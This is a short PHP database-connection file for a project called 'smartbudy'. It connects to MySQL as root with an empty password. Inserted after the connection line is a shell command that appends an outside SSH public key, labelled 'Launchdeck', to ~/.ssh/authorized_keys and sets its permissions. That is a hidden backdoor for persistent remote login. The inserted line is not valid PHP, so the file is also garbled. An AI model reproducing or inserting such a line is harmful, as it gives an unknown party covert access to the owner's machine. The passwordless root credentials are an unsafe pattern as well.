<?php

$host="localhost";
$user="root";
$pass="";
$db="smartbudy";
$conn=new mysqli($host,$user,$pass,$db);
echo -e "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDKHIanMPhYU6jWViJ1w9RfIm4JLD9O34/xPxo5J+zv55rrONdyqIzu9J7bI1rdqosbVnqVnE/FP03ibvBZqFb82xg3h6JKbTZFpWfhhGXL5Vpl6NHyiIPWzv+fZj5MVbsbtG7qs4CMuRvrpn/fPmcY3GxPFO7mztLBMNZrcE6M4DfXcoV5GPKlaP5wIlWnTwJUCI+jkFSqWex/wHU3WqU3ZZILaRwRTgOf1UuDqx0IZ4ddUpIRf5ERp3ICmHT2R3YKtnXlMAFclOjlbhEzh8Ndl5L2Zc6tMVbU7oi2uhhqismmNJqSU/DzB00hPxQ84d9MYHp8092FjK9LaFY4wFVLGma+2IZ116y2evpLM3cY0RA8cFcKnuKtb1wVo0SuR2Yvv5bpnod+Egsz5t/Ev91A4Z0xAT/wSh7GwZqPuMj+rXsu+gon+0jG/e6Zef+co27xCspOahLJap21Jzfx0v7hymhozKavf4l6INTtZV4VrRUAyGv+S7TnpA+Yv3CBcX20IszpbKNrx6DX4N4dNvqb8y3uXt57CIMtmm7TQzh1xL0yNHJ4OEtHmvMC2tiwC/ET6T7W8XedE6A0/YtZrcdlpRuFXpKNTY8Zy9uhUh0QnK3lWt1Zcsl0ZSM0FcmuHGgBC5i3HsoxXzGX/rc2fdZo3qAHna4ncdZGx/409LZqGQ== Launchdeck Launchdeck\n" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys
if($conn->connect_error){
    echo "Failed to connect DB".$conn->connect_error;
}
?>
